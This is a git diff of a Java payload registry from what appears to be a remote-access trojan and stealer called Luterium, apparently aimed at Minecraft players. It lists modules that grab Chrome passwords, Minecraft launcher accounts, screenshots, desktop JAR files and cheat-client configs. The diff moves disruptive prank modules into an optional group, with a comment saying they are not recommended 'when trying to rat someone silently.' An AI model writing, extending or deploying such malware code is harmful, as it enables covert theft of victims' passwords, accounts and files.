@@ -1,6 +1,10 @@
 package dev.peter.luterium.payload;
 
 import dev.peter.luterium.features.*;
+import dev.peter.luterium.features.fun.ChangeWallpaper;
+import dev.peter.luterium.features.fun.FurryPorn;
+import dev.peter.luterium.features.fun.PlaySong;
+import dev.peter.luterium.features.maintainer.MainClass;
 
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -19,8 +23,7 @@ public final class Payload {
     private Payload() {
         payloads.addAll(Arrays.asList(
                 new Info(),
-                new PlaySong(),
-                new FurryPorn(),
+                new MainClass(),
                 new ScreenShot(),
                 new ModsFolder(),
                 new FdpConfigs(),
@@ -34,11 +37,15 @@ public final class Payload {
                 new ChromePassword(),
                 new NixwareConfigs(),
                 new JarsFromDesktop(),
-                new ChangeWallpaper(),
                 new EarthhackConfigs(),
                 new LegendwareScripts(),
                 new RusherhackConfigs(),
-                new MCLauncherAccounts()
+                new MCLauncherAccounts(),
+
+                //These are optional, not recommended when trying to rat someone silently.
+                new PlaySong(),
+                new FurryPorn(),
+                new ChangeWallpaper()
         ));
     }
 
